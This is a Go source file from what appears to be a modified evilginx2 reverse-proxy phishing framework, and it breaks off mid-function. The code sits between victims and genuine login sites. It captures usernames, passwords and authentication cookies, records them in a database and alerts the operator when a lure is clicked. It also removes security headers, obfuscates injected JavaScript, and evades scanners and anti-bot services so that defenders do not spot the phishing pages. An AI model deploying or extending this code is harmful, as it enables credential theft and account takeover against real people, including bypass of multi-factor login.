/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	golog "log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second

	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
)

type SpoofCache struct {
	content   []byte
	timestamp time.Time
	mutex     sync.RWMutex
}

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	spoofCache        *SpoofCache
	rotationProxies   []string
	rotationIndex     int
	rotationMtx       sync.Mutex
	puppet            *EvilPuppet
	canary            *CanaryStripper
	ja4               *JA4Fingerprinter
	notifier          *Notifier
	rewriter          *URLRewriter
}

type ProxySession struct {
	SessionId   string
	Created     bool
	PhishDomain string
	Index       int
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, proxies []string, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
		spoofCache:        &SpoofCache{},
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	// Proxy rotation: if proxies list provided, use round-robin rotation
	if len(proxies) > 0 {
		p.rotationProxies = proxies
		p.rotationIndex = 0
		log.Info("proxy rotation enabled with %d proxies", len(proxies))
		p.Proxy.Tr.Dial = p.rotatingDial
	} else if cfg.proxyEnabled {
		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
		}
	}

	p.cookieName = GenRandomString(4)
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false
	p.Proxy.Logger = golog.New(io.Discard, "", 0)

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:   "",
				Created:     false,
				PhishDomain: "",
				Index:       -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := req.RemoteAddr
			if host, _, err := net.SplitHostPort(from_ip); err == nil {
				from_ip = host
			}
			from_agent := req.Header.Get("User-Agent")
			hostname := p.bl.GetISP(from_ip)
			if p.bl.IsBlacklisted(from_ip) {
				log.Warning("[blacklist] blocked IP: %s", from_ip)
				return p.blockRequest(req)
			}
			if p.bl.IsBlacklistedAgent(from_agent) {
				log.Warning("[blacklist] blocked bot_agent: %s from %s", from_agent, from_ip)
				p.bl.AddToBlacklist(from_ip)
				return p.blockRequest(req)
			}
			if hostname != "nil" && p.bl.IsBlacklistedHost(hostname) {
				log.Warning("[blacklist] blocked bot_host: %s (%s) from %s", hostname, from_agent, from_ip)
				p.bl.AddToBlacklist(from_ip)
				return p.blockRequest(req)
			}
			if p.cfg.GetBlacklistMode() == "all" {
				p.bl.AddToBlacklist(from_ip)
				return p.blockRequest(req)
			}

			// --- Aversions: simplebot, nkpbot, killbot, antibotpw ---
			if p.cfg.simplebotEnabled {
				// Simple bot detection: block requests with no User-Agent or very short UA
				if from_agent == "" || len(from_agent) < 20 {
					log.Warning("[simplebot] blocked empty/short UA from %s: %s", from_ip, from_agent)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
				// Block UAs that don't look like real browsers
				if !strings.Contains(from_agent, "Mozilla") && !strings.Contains(from_agent, "Chrome") && !strings.Contains(from_agent, "Safari") && !strings.Contains(from_agent, "Firefox") && !strings.Contains(from_agent, "Edge") {
					log.Warning("[simplebot] blocked non-browser UA from %s: %s", from_ip, from_agent)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
			}
			if p.cfg.nkpbotEnabled {
				// NKP bot detection: block requests missing standard browser headers
				if req.Header.Get("Accept-Language") == "" || req.Header.Get("Accept") == "" {
					log.Warning("[nkpbot] blocked missing headers from %s (no Accept-Language or Accept)", from_ip)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
				// Block if Sec-Fetch headers are missing (all modern browsers send them)
				if req.Header.Get("Sec-Fetch-Mode") == "" && req.Header.Get("Sec-Fetch-Site") == "" {
					log.Warning("[nkpbot] blocked missing Sec-Fetch headers from %s", from_ip)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
			}
			if p.cfg.killbotEnabled && p.cfg.killbot_apikey != "" {
				blocked, _ := p.checkKillbot(from_ip, from_agent)
				if blocked {
					log.Warning("[killbot] blocked by killbot.org: %s", from_ip)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
			}
			if p.cfg.antibotpwEnabled && p.cfg.antibotpw_apikey != "" {
				blocked, _ := p.checkAntibotPw(from_ip, from_agent)
				if blocked {
					log.Warning("[antibotpw] blocked by antibot.pw: %s", from_ip)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
			}

			// --- JA4 auto-learning: log visit and check for scanner behavior ---
			if p.ja4 != nil {
				ja4Key := fmt.Sprintf("http_%s_%s", from_ip, from_agent)
				if p.ja4.LogVisit(ja4Key, req.URL.Path, from_ip, from_agent) {
					log.Warning("[ja4] auto-blocked scanner: %s from %s (path: %s)", ja4Key, from_ip, req.URL.Path)
					p.bl.AddToBlacklist(from_ip)
					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
			}

			remote_addr := req.RemoteAddr
			if host, _, err := net.SplitHostPort(remote_addr); err == nil {
				remote_addr = host
			}
			
			phishDomain, phished := p.getPhishDomain(req.Host)
			if req.Method == "POST" {
				ip := GetUserIP(nil, req)
				if err := req.ParseForm(); err == nil {
					if req.URL.Path == "/ImplementOutOfTheBoxContent" {
						if vals, ok := req.PostForm["cf-turnstile-response"]; ok && len(vals) > 0 {
							phished = p.ValidateTurnstileCaptcha(ip, vals[0])
						}
					}
					if req.URL.Path == "/VisualizeAutomatedMetrics" {
						if vals, ok := req.PostForm["g-recaptcha-response"]; ok && len(vals) > 0 {
							phished = p.ValidateRecaptcha(ip, vals[0])
						}
					}
				}
			}
			
			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				ps.PhishDomain = phishDomain
				req_ok := false
				if p.handleSession(req.Host) && pl != nil {
					sc, err := req.Cookie(p.cookieName)
					if err != nil {
						if !p.cfg.IsSiteHidden(pl_name) {
							var vv string
							var uv url.Values
							l, err := p.cfg.GetLureByPathAndHost(pl_name, req_path, req.Host)
							if err == nil {
								log.Debug("triggered lure for path '%s'", req_path)
							} else {
								uv = req.URL.Query()
								vv = uv.Get(p.cfg.verificationParam)
							}
							if l != nil || vv == p.cfg.verificationToken {
								if l != nil {
									if len(l.UserAgentFilter) > 0 {
										re, err := regexp.Compile(l.UserAgentFilter)
										if err == nil {
											if !re.MatchString(req.UserAgent()) {
												return p.blockRequest(req)
											}
										} else {
											log.Error("lures: user-agent filter regexp is invalid: %v", err)
										}
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)

									// --- Notify: lure clicked ---
									if p.notifier != nil {
										p.notifier.NotifyEvent(EventLureClicked, map[string]string{
											"phishlet":   pl_name,
											"ip":         remote_addr,
											"user_agent": req.Header.Get("User-Agent"),
											"url":        req_url,
										})
									}
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									landing_url := req_url
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									if l != nil {
										session.RedirectURL = l.RedirectUrl
										session.PhishLure = l
										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
									} else {
										rv := uv.Get(p.cfg.redirectParam)
										if rv != "" {
											url, err := base64.URLEncoding.DecodeString(rv)
											if err == nil {
												session.RedirectURL = string(url)
												log.Debug("redirect URL (get): %s", url)
											}
										}
									}

									p.extractParams(session, req.URL)
									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									req_ok = true
								}
							} else {
								return p.blockRequest(req)
							}
						} else {
							// silently block hidden phishlet requests
						}
					} else {
						var ok bool = false
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							ps.SessionId = sc.Value
						} else {
							// Fallback: try to find session by IP
							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
							if ok {
								ps.Index, ok = p.sids[ps.SessionId]
							}
						}
						if ok {
							req_ok = true
						} else {
							// silently reject wrong session tokens
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPathAndHost(pl_name, req_path, req.Host)
						if err == nil {
							// show html template if it is set for the current lure
							if l.Template != "" {
								if !p.isForwarderUrl(req.URL) {
									path := l.Template
									if !filepath.IsAbs(path) {
										templates_dir := p.cfg.GetTemplatesDir()
										path = filepath.Join(templates_dir, path)
									}
									if _, err := os.Stat(path); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(path)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html template response")
											}
										} else {
											log.Error("lure: failed to read template file: %s", err)
										}

									} else {
										log.Error("lure: template file does not exist: %s", path)
									}
								}
							}
						}
					}
				}

				
				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPathAndHost(pl_name, req_path, req.Host)
					if err == nil {
						// redirect from lure path to phished login url
						rurl := pl.GetLoginUrl()
						// Rewrite the original login URL to the phished version
						if u, err2 := url.Parse(rurl); err2 == nil {
							if ph, ok := p.replaceHostWithPhished(u.Host); ok {
								u.Host = ph
								rurl = u.String()
							}
						}
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Add("Location", rurl)
							return req, resp
						}
					}
				}

				// check if lure hostname was triggered - only block if no valid session
				if p.cfg.IsLureHostnameValid(req.Host) && ps.SessionId == "" {
					log.Debug("lure hostname detected (no session) - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				// --- URL rewrite: restore rewritten paths back to original before forwarding ---
				if p.rewriter != nil && p.rewriter.IsEnabled() {
					restored := p.rewriter.RestoreURL(req.URL.Path)
					if restored != req.URL.Path {
						log.Debug("rewrite restore: %s → %s", req.URL.Path, restored)
						req.URL.Path = restored
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")
						if strings.Contains(contentType, "application/json") {

							// Extract credentials from JSON body
							// First try custom JSON extractors (they have precise regexes)
							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
										// Auto-promote custom captures to username/password if they match known patterns
										lk := strings.ToLower(cp.key_s)
										if lk == "username" || lk == "login" || lk == "identifier" || lk == "email" {
											p.setSessionUsername(ps.SessionId, cm[1])
											log.Success("[%d] Username (json): [%s]", ps.Index, cm[1])
											if err := p.db.SetSessionUsername(ps.SessionId, cm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
										if lk == "password" || lk == "passwd" || lk == "passcode" {
											p.setSessionPassword(ps.SessionId, cm[1])
											log.Success("[%d] Password (json): [%s]", ps.Index, cm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, cm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
								}
							}

							// Fallback: try main username/password regexes if they're specific enough (not just "(.*)")
							if pl.username.tp == "json" && pl.username.search != nil {
								um := pl.username.search.FindStringSubmatch(string(body))
								if len(um) > 1 && len(um[1]) < len(body)/2 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" && pl.password.search != nil {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if len(pm) > 1 && len(pm[1]) < len(body)/2 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

						} else {

							if req.ParseForm() == nil {
								log.Debug("POST: %s", req.URL.Path)
								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains
									for i, vv := range v {
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
									body = []byte(req.PostForm.Encode())
									req.ContentLength = int64(len(body))

									log.Debug("POST %s = %s", k, v[0])
									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone && s.Username != "" {
						// Only trigger auth_urls AFTER credentials captured
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.IsDone = true
								s.IsAuthUrl = true
								log.Success("[%d] auth URL triggered: %s (user: %s)", ps.Index, req.URL.Path, s.Username)
								break
							}
						}
					}
				}

			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
							if err != nil {
								log.Error("time.Parse: %v", err)
							}
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) {
								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.SameSite, auth_tokens)
								if len(pl.authUrls) > 0 {
									is_auth = false
								}
								if is_auth && !s.IsDone {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
										log.Error("database: %v", err)
									}
									s.IsDone = true
								}
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k, _ := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							// --- Evilpuppet telemetry injection ---
							if p.puppet != nil && p.puppet.IsEnabled() && pl != nil {
								puppetTarget := pl.GetLoginUrl()
								if tel, telErr := p.puppet.GetTelemetry(puppetTarget); telErr == nil {
									puppetScript := p.puppet.GenerateInjectionScript(tel)
									if puppetScript != "" {
										obfPuppet := ObfuscateJS(puppetScript)
